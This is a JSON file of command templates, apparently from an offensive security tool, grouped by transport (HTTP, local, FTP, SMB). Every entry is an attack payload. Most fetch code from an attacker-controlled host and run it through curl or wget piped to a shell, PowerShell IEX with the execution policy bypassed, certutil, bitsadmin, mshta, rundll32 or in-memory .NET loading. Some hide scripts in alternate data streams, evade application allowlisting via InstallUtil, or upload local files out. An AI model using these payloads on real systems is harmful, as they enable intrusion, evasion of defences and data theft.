{
  "http": {
    "curl": {
      "payload": "curl -sSL '<<TAG>>'"
    },
    "curl-shell": {
      "payload": "curl -sSL '<<TAG>>' | <<SHELLBIN>>"
    },
    "curl-run": {
      "payload": "curl <<TAG>> -o <<FILENAME>> && chmod 777 <<FILENAME>> && ./<<FILENAME>>"
    },
    "curl-download": {
      "payload": "curl '<<TAG>>' -o <<FILENAME>>"
    },
    "curl-upload": {
      "payload": "UPFILE=<<FILENAME>>;curl -H \"X-Filename: `basename $UPFILE`\" --data-binary @$UPFILE <<HTTP>>/upload"
    },
    "wget": {
      "payload": "wget '<<TAG>>' -O <<FILENAME>>"
    },
    "wget-shell": {
      "payload": "wget '<<TAG>>' && <<SHELLBIN>> <<FILENAME>>"
    },
    "wget-run": {
      "payload": "wget <<TAG>> -O <<FILENAME>> && chmod 777 <<FILENAME>> && ./<<FILENAME>>"
    },
    "ps-iwr-iex": {
      "payload": "IEX(IWR <<TAG>> -UseBasicParsing)"
    },
    "ps-iwr-iex-bypass-ep": {
      "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass IEX(IWR <<TAG>> -UseBasicParsing)"
    },
    "ps-iwr-download": {
      "payload": "IWR -OutF \"<<FILENAME>>\" \"<<TAG>>\""
    },
    "ps-iwr-run": {
      "payload": "IWR -OutF \"<<FILENAME>>\" \"<<TAG>>\";&\".\\<<TAG>>\""
    },
    "ps-net-webclient-download": {
      "payload": "(New-Object System.Net.WebClient).DownloadFile(\"<<TAG>>\",(Get-Item .).FullName+\"\\<<FILENAME>>\")"
    },
    "ps-net-webclient-run": {
      "payload": "(New-Object System.Net.WebClient).DownloadFile(\"<<TAG>>\",(Get-Item .).FullName+\"\\<<FILENAME>>\");&\".\\<<FILENAME>>\""
    },
    "ps-bitstransfer-download": {
      "payload": "Import-Module bitstransfer;start-bitstransfer -source \"<<TAG>>\" -destination \".\\<<FILENAME>>\""
    },
    "ps-bitstransfer-run": {
      "payload": "Import-Module bitstransfer;start-bitstransfer -source \"<<TAG>>\" -destination \".\\<<FILENAME>>\";&\".\\<<FILENAME>>\""
    },
    "certutil-download": {
      "payload": "certutil.exe -urlcache -split -f \"<<TAG>>\" \".\\<<FILENAME>>\""
    },
    "certutil-run": {
      "payload": "certutil.exe -urlcache -split -f \"<<TAG>>\" \".\\<<FILENAME>>\" && .\\<<FILENAME>>"
    },
    "certreq-upload": {
      "payload": "CertReq -Post -config <<HTTP>>/upload <<FILENAME>>"
    },
    "bitsadmin-ps-download": {
      "payload": "bitsadmin.exe /RAWRETURN /TRANSFER x /DOWNLOAD /PRIORITY FOREGROUND \"<<TAG>>\" ((Get-Item .).FullName + \"\\make.bat\")"
    },
    "bitsadmin-ps-run": {
      "payload": "bitsadmin.exe /RAWRETURN /TRANSFER x /DOWNLOAD /PRIORITY FOREGROUND \"<<TAG>>\" ((Get-Item .).FullName + \"\\make.bat\");&\".\\<<FILENAME>>\""
    },
    "bitsadmin-cmd-download": {
      "payload": "bitsadmin.exe /RAWRETURN /TRANSFER x /DOWNLOAD /PRIORITY FOREGROUND \"<<TAG>>\" \"%cd%\\make.bat\""
    },
    "bitsadmin-cmd-run": {
      "payload": "bitsadmin.exe /RAWRETURN /TRANSFER x /DOWNLOAD /PRIORITY FOREGROUND \"<<TAG>>\" \"%cd%\\make.bat\" && \".\\<<FILENAME>>\""
    },
    "cmd-ads-run": {
      "payload": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:<<TAG>> ^scrobj.dll > <<RNG:0:8>>.doc:<<RNG:1:8>>.bat && cmd.exe - < <<RNG:0:8>>.doc:<<RNG:1:8>>.bat"
    },
    "ieexec-run": {
      "payload": "ieexec.exe <<TAG>>"
    },
    "mshta-run-vbscript": {
      "payload": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:<<TAG>>\"\")\"))"
    },
    "mshta-run-javascript": {
      "payload": "mshta.exe javascript:a=GetObject(\"script:<<TAG>>\").Exec();close();"
    },
    "rundll32-js-ps": {
      "payload": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('<<TAG>>');\")"
    },
    "dotnet-in-memory-execution": {
      "payload": "[System.Reflection.Assembly]::Load((IWR <<TAG>> -UseBasicParsing).Content)\n<<DOTNETENTRYPOINTPS>>(\"\".Split(\" \"))"
    }
  },
  "local": {
    "certoc-run-dll": {
      "payload": "certoc.exe -LoadDLL \"<<FILENAME>>\""
    },
    "awl-bypass-installutil": {
      "payload": "InstallUtil.exe /logfile= /LogToConsole=false /U \"<<FILENAME>>\""
    },
    "qpdf-file-reading": {
      "payload": "qpdf --empty /tmp/<<RNG:0:8>> --qdf --add-attachment <<FILENAME>> --"
    }
  },
  "ftp": {
    "cmd-ftp-download": {
      "payload": "cmd.exe /c \"@echo open <<LHOST>> 21><<RNG:0:8>>.txt&@echo binary>><<RNG:0:8>>.txt&@echo GET <<FILEPATH>> >><<RNG:0:8>>.txt&@echo quit>><<RNG:0:8>>.txt&@ftp -A -s:<<RNG:0:8>>.txt -v -i&del <<RNG:0:8>>.txt\""
    },
    "cmd-ftp-upload": {
      "payload": "cmd.exe /c \"@echo open <<LHOST>> 21><<RNG:0:8>>.txt&@echo binary>><<RNG:0:8>>.txt&@echo PUT <<FILEPATH>> >><<RNG:0:8>>.txt&@echo quit>><<RNG:0:8>>.txt&@ftp -A -s:<<RNG:0:8>>.txt -v -i&del <<RNG:0:8>>.txt\""
    },
    "cmd-ftp-run": {
      "payload": "cmd.exe /c \"@echo open <<LHOST>> 21><<RNG:0:8>>.txt&@echo binary>><<RNG:0:8>>.txt&@echo GET <<FILEPATH>> >><<RNG:0:8>>.txt&@echo quit>><<RNG:0:8>>.txt&@ftp -A -s:<<RNG:0:8>>.txt -v -i&del <<RNG:0:8>>.txt&\\\".\\<<FILENAME>>\\\"\""
    }
  },
  "smb": {
    "cmd-copy": {
      "payload": "cmd.exe /c \"COPY <<TAG>> .\""
    },
    "cmd-copy-run": {
      "payload": "cmd.exe /c \"COPY <<TAG>> .\" && .\\\"<<FILENAME>>\""
    },
    "cmd-upload": {
      "payload": "cmd.exe /c \"type .\\\"<<FILENAME>>\" > <<SMB>>\\uploads\""
    },
    "esentutl-copy": {
      "payload": "esentutl.exe /y <<TAG>> /d . /o"
    },
    "esentutl-run": {
      "payload": "esentutl.exe /y <<TAG>> /d . /o && .\\\"<<FILENAME>>\""
    },
    "extract32-copy": {
      "payload": "extrac32.exe /C <<TAG>> .\\\"<<FILENAME>>\""
    },
    "extract32-run": {
      "payload": "extrac32.exe /C <<TAG>> .\\\"<<FILENAME>>\" && .\\\"<<FILENAME>>\""
    },
    "rundll32-run": {
      "payload": "rundll32.exe <<TAG>>,DllMain"
    }
  }
}